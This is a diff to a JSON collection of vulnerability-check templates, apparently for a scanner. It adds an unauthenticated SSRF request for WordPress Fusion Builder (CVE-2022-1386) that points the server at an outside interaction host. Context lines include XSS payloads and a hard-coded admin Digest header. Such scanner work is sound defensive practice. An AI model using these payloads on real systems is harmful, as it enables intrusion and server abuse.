@@ -16118,8 +16118,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
@@ -18241,6 +18241,21 @@
           "path": [
             "{{BaseURL}}/wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1&class=%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
             "{{BaseURL}}/wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-1386",
+      "info": {
+        "name": "WordPress Fusion Builder < 3.6.2 - Unauthenticated SSRF",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nOrigin: {{BaseURL}}\nReferer: {{RootURL}}\n\naction=fusion_form_update_view\n",
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=---------------------------30259827232283860776499538268\nOrigin: {{BaseURL}}\nReferer: {{RootURL}}\n\n-----------------------------30259827232283860776499538268\nContent-Disposition: form-data; name=\"formData\"\n\nemail=example%40example.com&fusion_privacy_store_ip_ua=false&fusion_privacy_expiration_interval=48&priva\ncy_expiration_action=ignore&fusion-form-nonce-0={{fusionformnonce}}&fusion-fields-hold-private-data=\n-----------------------------30259827232283860776499538268\nContent-Disposition: form-data; name=\"action\"\n\nfusion_form_submit_form_to_url\n-----------------------------30259827232283860776499538268\nContent-Disposition: form-data; name=\"fusion_form_nonce\"\n\n{{fusionformnonce}}\n-----------------------------30259827232283860776499538268\nContent-Disposition: form-data; name=\"form_id\"\n\n0\n-----------------------------30259827232283860776499538268\nContent-Disposition: form-data; name=\"post_id\"\n\n0\n-----------------------------30259827232283860776499538268\nContent-Disposition: form-data; name=\"field_labels\"\n\n{\"email\":\"Email address\"}\n-----------------------------30259827232283860776499538268\nContent-Disposition: form-data; name=\"hidden_field_names\"\n\n[]\n-----------------------------30259827232283860776499538268\nContent-Disposition: form-data; name=\"fusionAction\"\n\nhttps://oast.me\n-----------------------------30259827232283860776499538268\nContent-Disposition: form-data; name=\"fusionActionMethod\"\n\nGET\n-----------------------------30259827232283860776499538268--\n"
           ]
         }
       ]
